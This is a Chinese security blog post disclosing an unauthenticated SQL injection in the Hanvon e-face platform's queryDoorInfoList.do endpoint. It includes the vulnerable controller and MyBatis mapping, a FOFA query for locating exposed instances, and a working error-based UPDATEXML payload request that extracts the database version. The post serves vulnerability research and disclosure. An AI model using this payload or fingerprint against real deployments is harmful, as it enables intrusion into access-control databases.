---
title: "汉王e脸通综合管理平台 queryDoorInfoList.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-queryDoorInfoList-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-querydoorinfolist.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 queryDoorInfoList.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/26 12:12
* 998浏览
* [0评论](#comment)
* 35分钟阅读

深入探索

软件

身份验证

验证


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `queryDoorInfoList.do` 接口存在 [SQL 注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `DoorInfoController` 里关于 `queryDoorInfoList` 的实现

```
@RequestMapping(
    value = {"queryDoorInfoList.do"},
    method = {RequestMethod.GET}
)
@ResponseBody
public RequestJson queryDoorInfoList(@RequestParam(required = false) Integer page, @RequestParam(required = false) Integer pageSize, @RequestParam(required = false) String doorName, @RequestParam(required = false) Integer controlId, @RequestParam(required = false) Integer locationId, @RequestParam(required = false) String order, @RequestParam(required = false) String columnKey) {
    RequestJson result = new RequestJson();
    ControlInfoParam record = new ControlInfoParam();

    try {
        if (page == null) {
            page = Constants.DEFAULT_START_PAGE_INDEX;
        }

        if (pageSize == null) {
            pageSize = Constants.PAGE_SIZE;
        }

        record.setDoorName(doorName);
        record.setControlId(controlId);
        record.setLocationId(locationId);
        record.setOrder(order);
        record.setColumnKey(columnKey);
        PageHelper.startPage(page, pageSize);
        List<DoorInfoVO> infoList = this.doorInfoAsm.queryList(record);
        PageInfo<DoorInfoVO> info = new PageInfo(infoList);
        Map<String, Object> map = new HashMap();
        map.put("items", info.getList());
        map.put("numRows", info.getTotal());
        map.put("page", info.getPageNum());
        map.put("pageSize", info.getPageSize());
        result = RequestJson.successResult(result, map, getMessage("basics_query_success"));
    } catch (Exception e) {
        String msg = getMessage("basics_go_wrong") + e.getLocalizedMessage();
        result = RequestJson.errorResult(result, msg);
        this.logger.error(msg);
        e.printStackTrace();
    }

    return result;
}
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，GET请求获取多个参数后存入 record 里，然后带入 `doorInfoAsm.queryList` 看 DoorInfoDao.xml 对`queryList` 查询的设置

代码安全审计

深入探索

数据库

SQL

安全

```
<select id="queryList" resultMap="BaseResultMap2">
    SELECT
    DDI.ID, DDI.DEVICE_CONTROL_ID deviceControlId,DDI.MEMO, DDI.NAME, DDI.DOOR_SORT, DDI.CONTROL_WAY,DDI.OPEN_DELAY, DD.SZ_NAME AS
    controlName
    FROM ACCESS_DOOR_INFO DDI
    LEFT JOIN DEV_DEVICE DD ON DD.NG_ID = DDI.DEVICE_CONTROL_ID
    WHERE 1=1 AND DDI.IS_DELETED != 1
    <if test="doorName != null and doorName != ''">
        and DDI.NAME like CONCAT(CONCAT('%', #{doorName}, '%'))
    </if>
    <if test="controlId != null ">
        and DDI.DEVICE_CONTROL_ID = #{controlId}
    </if>

    ORDER BY
    <if test="order == null or order == ''">
        CREATE_TIME DESC
    </if>
    <if test="order != null and order != ''">
        ${columnKey} ${order}
    </if>
</select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

同样存在此问题的还有如下这些（但没有在代码里找到使用）

漏洞预警服务

getDoorByEmployeeId

[![汉王e脸通综合管理平台 queryDoorInfoList.do SQL注入漏洞](images/img-001-06a2f7d4c552.webp)](https://image.mrxn.net/95fc299b4db54b82ab661088f1d6cc1b.webp)

authorityDoor

物流软件安全

[![汉王e脸通综合管理平台 queryDoorInfoList.do SQL注入漏洞](images/img-002-596ec662fdb7.webp)](https://image.mrxn.net/fca5e9601f164bd9a8680b16bf07391a.webp)

selectByExample

安全研究工具

[![汉王e脸通综合管理平台 queryDoorInfoList.do SQL注入漏洞](images/img-003-c65effff2028.webp)](https://image.mrxn.net/785e03b7eaf34c0290b15821b5fabd80.webp)

Update\_By\_Example\_Where\_Clause

[![汉王e脸通综合管理平台 queryDoorInfoList.do SQL注入漏洞](images/img-004-bfab5c9e2e21.webp)](https://image.mrxn.net/bbbb1be5284746d1bc81efb854d7d8a3.webp)

Example\_Where\_Clause

[![汉王e脸通综合管理平台 queryDoorInfoList.do SQL注入漏洞](images/img-005-0d138b253616.webp)](https://image.mrxn.net/bcd0eadcf099453c9446d4b8c9b30478.webp)

# 漏洞复现

```
GET /manage/doorInfo/queryDoorInfoList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,(SELECT+(ELT(2920=2920,1))),0x7e),8357)) HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 queryDoorInfoList.do SQL注入漏洞](images/img-006-676273b39fd4.webp)](https://image.mrxn.net/38e384495e48468ba3897fc58a7bcc9b.webp)

成功利用报错注入获取到数据库版本号信息

网络安全

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 queryDoorInfoList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryDoorInfoList-sqli.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-queryDoorInfoList-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-queryDoorInfoList-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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